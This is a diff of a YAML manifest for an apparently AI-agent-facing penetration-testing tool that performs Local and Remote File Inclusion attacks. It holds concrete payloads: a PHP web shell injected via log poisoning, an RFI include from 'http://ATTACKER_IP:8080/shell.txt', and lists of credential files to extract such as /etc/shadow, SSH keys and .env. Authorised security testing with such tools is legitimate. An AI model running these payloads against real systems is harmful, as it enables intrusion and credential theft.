@@ -1,6 +1,6 @@
 name: lfi-rfi
 version: "1.0"
-description: "Local/Remote File Inclusion vulnerability testing"
+description: "Local File Inclusion (LFI) and Remote File Inclusion (RFI) testing and exploitation tool. 5 methods: test_lfi (automated directory traversal with multiple encodings and depths), test_rfi (remote URL inclusion with PHP wrappers), read_file (extract specific files via confirmed LFI), php_filter (read PHP source code via php://filter/convert.base64-encode), log_poison (inject PHP code into log files via User-Agent/Referer/X-Forwarded-For headers for RCE). Supports Linux and Windows path traversal patterns. Uses {PAYLOAD} placeholder in URLs. Authenticated testing via cookies."
 image: "ghcr.io/silicon-works/mcp-tools-lfi-rfi:latest"
 image_size_mb: 100
 
@@ -26,12 +26,12 @@ resources:
 # Routing hints for tool selection
 routing:
   use_for:
-    - "Local File Inclusion testing"
-    - "Remote File Inclusion testing"
-    - "path traversal"
-    - "directory traversal"
-    - "PHP filter exploitation"
-    - "log poisoning"
+    - "test URL parameter for Local File Inclusion with path traversal"
+    - "read arbitrary files on web server via LFI vulnerability"
+    - "read PHP source code via php://filter wrapper"
+    - "test for Remote File Inclusion vulnerability"
+    - "achieve RCE via LFI combined with log poisoning"
+    - "directory traversal testing with multiple encodings"
   never_use_for:
     - "SQL injection"
     - "directory enumeration"
@@ -48,8 +48,8 @@ routing:
 
 methods:
   test_lfi:
-    description: "Test URL parameter for Local File Inclusion vulnerability"
-    when_to_use: "When file parameter is suspected vulnerable to path traversal"
+    description: "Test a URL parameter for Local File Inclusion by trying path traversal sequences (../) at multiple depths with multiple encodings (plain, URL-encoded, double-URL-encoded, null byte, etc.). Tries to read /etc/passwd (Linux) or C:\\Windows\\win.ini (Windows) as proof of concept. Uses {PAYLOAD} placeholder in the URL."
+    when_to_use: "When a web page has a file/page/template parameter that might be vulnerable to path traversal. Examples: url='http://target/page.php?file={PAYLOAD}', url='http://target/index.php?page={PAYLOAD}'. The tool automatically tries traversal depths 1-8 with various encodings. Set os='linux' or 'windows' to target specific paths. Use success_pattern for custom detection when the default /etc/passwd check doesn't work."
     params:
       url:
         type: string
@@ -92,149 +92,149 @@ methods:
         description: "First successful payload"
 
   test_rfi:
-    description: "Test URL parameter for Remote File Inclusion vulnerability"
-    when_to_use: "When parameter may include remote URLs"
+    description: "Test a URL parameter for Remote File Inclusion by trying 6 default PHP wrappers: direct URL, http://, https://, ftp://, data://text/plain;base64 (encodes a PHP include statement), and expect://. Replaces {PAYLOAD} in the URL with each wrapper+remote_url combination. Checks for HTTP 200 with non-empty body as success indicator. IMPORTANT: verify results by checking if your controlled server received an inbound request — a 200 response alone does not confirm RFI."
+    when_to_use: "When a URL parameter might allow remote URL inclusion (typically PHP applications with allow_url_include=On). Requires a controlled remote server — use netcat http_listen or a VPS to serve a test file. Workflow: (1) start netcat http_listen on attacker, (2) test_rfi with remote_url pointing to your listener, (3) check http_requests on the listener to verify the target fetched your URL. If allow_url_include is off, try php_filter or LFI-to-RCE via log_poison instead."
     params:
       url:
         type: string
         required: true
-        description: "Target URL with {PAYLOAD} placeholder"
+        description: "Target URL with {PAYLOAD} placeholder where the file/page parameter is (e.g., 'http://target/page.php?file={PAYLOAD}')."
       remote_url:
         type: string
         required: true
-        description: "URL to include (your controlled server)"
+        description: "URL on your controlled server to include (e.g., 'http://ATTACKER_IP:8080/shell.txt'). The file should contain PHP code if testing PHP RFI."
       wrappers:
         type: array
-        description: "PHP wrappers to try"
+        description: "PHP wrappers to try. Default: ['', 'http://', 'https://', 'ftp://', 'data://text/plain;base64,', 'expect://']. Override to test specific wrappers only."
       cookie:
         type: string
-        description: "Cookie header"
+        description: "Cookie header for authenticated testing (e.g., 'PHPSESSID=abc123')."
       headers:
         type: object
-        description: "Custom HTTP headers"
+        description: "Custom HTTP headers as key-value pairs."
       timeout:
         type: integer
         default: 10
-        description: "Request timeout"
+        description: "Request timeout per wrapper attempt in seconds."
     returns:
       vulnerable:
         type: boolean
-        description: "Whether RFI may be possible"
+        description: "Whether any wrapper returned HTTP 200 with content (verify with remote server logs)."
       vulnerabilities:
         type: array
-        description: "Working wrappers"
+        description: "Wrappers that produced a 200 response with body length — each entry has wrapper, payload, url, status_code, body_length."
 
   read_file:
-    description: "Read a specific file via confirmed LFI vulnerability"
-    when_to_use: "After confirming LFI to read specific files"
+    description: "Read a specific file through a confirmed LFI vulnerability using the known-working traversal string and depth. Builds payload as (traversal * depth) + file_path, or wrapper + file_path if a PHP wrapper is specified. Returns the full response body (up to 100KB). Use this after test_lfi confirms the vulnerability — copy the working traversal and depth from those results."
+    when_to_use: "After test_lfi confirms LFI, to extract specific files. Use the working traversal/depth from test_lfi results. High-value files to read: /etc/shadow (password hashes), /home/*/.ssh/id_rsa (SSH keys), /var/www/html/wp-config.php (database creds), .env files, /proc/self/environ (environment variables with secrets), /etc/apache2/sites-enabled/* (vhost configs revealing internal paths). For PHP source code, use php_filter instead — read_file would execute the PHP rather than show source."
     params:
       url:
         type: string
         required: true
-        description: "Vulnerable URL with {PAYLOAD} placeholder"
+        description: "Vulnerable URL with {PAYLOAD} placeholder (same URL used in test_lfi)."
       file_path:
         type: string
         required: true
-        description: "File to read (e.g., /etc/passwd)"
+        description: "Absolute path of file to read (e.g., '/etc/shadow', '/home/user/.ssh/id_rsa', '/var/www/html/.env'). Leading slash is stripped when building traversal payload."
       traversal:
         type: string
         default: "../"
-        description: "Traversal string that works"
+        description: "Traversal string that worked in test_lfi (e.g., '../', '%2e%2e%2f', '..%2f'). Must match what test_lfi found."
       depth:
         type: integer
         default: 8
-        description: "Traversal depth"
+        description: "Traversal depth (number of times to repeat the traversal string). Use the depth from test_lfi results."
       wrapper:
         type: string
-        description: "PHP wrapper if needed"
+        description: "PHP wrapper to prepend instead of traversal (e.g., 'php://filter/convert.base64-encode/resource='). When set, traversal and depth are ignored."
       cookie:
         type: string
-        description: "Cookie header"
+        description: "Cookie header for authenticated testing (e.g., 'PHPSESSID=abc123')."
       headers:
         type: object
-        description: "Custom HTTP headers"
+        description: "Custom HTTP headers as key-value pairs."
       timeout:
         type: integer
         default: 15
-        description: "Request timeout"
+        description: "Request timeout in seconds. Increase for large files."
     returns:
       content:
         type: string
-        description: "File contents"
+        description: "File contents (up to 100KB). Full response body — may include surrounding HTML from the vulnerable page."
       content_length:
         type: integer
-        description: "Content length"
+        description: "Length of the file content in the response."
 
   php_filter:
-    description: "Use PHP filter wrapper to read file contents (base64 encoded)"
-    when_to_use: "To read PHP source code without execution"
+    description: "Read a file via php://filter/convert.base64-encode/resource= wrapper, which base64-encodes the file content before inclusion — preventing PHP execution and returning raw source code. The tool auto-extracts base64 strings from the response (regex: 20+ base64 chars) and decodes them. Does NOT require path traversal — PHP filter wrapper uses absolute paths directly. Returns both raw base64 and decoded content (up to 50KB)."
+    when_to_use: "To read PHP source code without it being executed by the server. Critical for: (1) reading PHP config files to find database credentials (wp-config.php, config.php, .env), (2) reading PHP application source to find hardcoded secrets or logic flaws, (3) reading any file when standard LFI fails due to PHP execution. Does NOT need traversal — use file_path='config.php' for relative or '/var/www/html/config.php' for absolute. Works on any PHP application with LFI where php:// wrappers are enabled (allow_url_include not required for filter wrapper)."
     params:
       url:
         type: string
         required: true
-        description: "Vulnerable URL with {PAYLOAD} placeholder"
+        description: "Vulnerable URL with {PAYLOAD} placeholder (e.g., 'http://target/page.php?file={PAYLOAD}')."
       file_path:
         type: string
         required: true
-        description: "File to read"
+        description: "File to read. Can be relative (e.g., 'config.php', '../wp-config.php') or absolute (e.g., '/var/www/html/index.php'). The tool prepends 'php://filter/convert.base64-encode/resource=' automatically."
       cookie:
         type: string
-        description: "Cookie header"
+        description: "Cookie header for authenticated testing (e.g., 'PHPSESSID=abc123')."
       headers:
         type: object
-        description: "Custom HTTP headers"
+        description: "Custom HTTP headers as key-value pairs."
       timeout:
         type: integer
         default: 15
-        description: "Request timeout"
+        description: "Request timeout in seconds."
     returns:
       decoded_content:
         type: string
-        description: "Decoded file content"
+        description: "Base64-decoded file content (up to 50KB). This is the actual source code."
       base64_content:
         type: string
-        description: "Raw base64 content"
+        description: "Raw base64 string extracted from the response. Useful for manual verification."
 
   log_poison:
-    description: "Attempt log poisoning via User-Agent or other headers"
-    when_to_use: "To achieve RCE via LFI + log poisoning"
+    description: "Achieve RCE via LFI + log poisoning in two steps: (1) inject PHP code into a server log file by sending a request with the payload in a chosen HTTP header (User-Agent, Referer, or X-Forwarded-For), (2) include the poisoned log file via the confirmed LFI vulnerability to trigger PHP execution. The injection request goes to the server's root URL. Then the log file is included via traversal. Checks if the payload text or '<?php' appears in the response to verify success."
+    when_to_use: "To escalate LFI to Remote Code Execution when RFI (allow_url_include) is disabled. Requires: (1) confirmed LFI vulnerability (run test_lfi first), (2) knowledge of the log file path. Common log paths: Apache=/var/log/apache2/access.log, Nginx=/var/log/nginx/access.log, mail=/var/log/mail.log, SSH=/var/log/auth.log. Typical payload: '<?php system($_GET[\"cmd\"]); ?>' — after poisoning, append &cmd=id to the URL to execute commands. Use User-Agent header by default (most reliably logged). If poisoning succeeds, subsequent requests to the LFI URL with the log file will execute your PHP code."
     params:
       url:
         type: string
         required: true
-        description: "Vulnerable URL with {PAYLOAD} placeholder"
+        description: "Vulnerable URL with {PAYLOAD} placeholder (same URL used in test_lfi). After poisoning, the log file is included via this URL."
       log_file:
         type: string
         required: true
-        description: "Log file path"
+        description: "Path to the log file to poison (e.g., '/var/log/apache2/access.log', '/var/log/nginx/access.log', '/var/log/mail.log'). Try read_file first to confirm the log file is readable via LFI."
       payload:
         type: string
         required: true
-        description: "Payload to inject (e.g., PHP code)"
+        description: "PHP code to inject into the log (e.g., '<?php system($_GET[\"cmd\"]); ?>' for command execution, '<?php phpinfo(); ?>' for testing). Keep payloads short — logs may truncate long values."
       traversal:
         type: string
         default: "../"
-        description: "Traversal string"
+        description: "Traversal string that works (from test_lfi results)."
       depth:
         type: integer
         default: 8
-        description: "Traversal depth"
+        description: "Traversal depth (from test_lfi results)."
       poison_header:
         type: enum
         values: [User-Agent, Referer, X-Forwarded-For]
         default: "User-Agent"
-        description: "Header to poison"
+        description: "HTTP header to inject the payload into. User-Agent is most commonly logged by Apache/Nginx. Try Referer or X-Forwarded-For if User-Agent is sanitized."
       cookie:
         type: string
-        description: "Cookie header"
+        description: "Cookie header for authenticated testing (e.g., 'PHPSESSID=abc123')."
       timeout:
         type: integer
         default: 15
-        description: "Request timeout"
+        description: "Request timeout in seconds for each of the two requests (poison + include)."
     returns:
       payload_visible:
         type: boolean
-        description: "Whether payload appears in log"
+        description: "Whether the injected payload text appears in the log file response. True means the log was successfully poisoned and PHP code is present."
       body_preview:
         type: string
-        description: "Response preview"
+        description: "First 2KB of the response after including the poisoned log file. Check for PHP execution output."
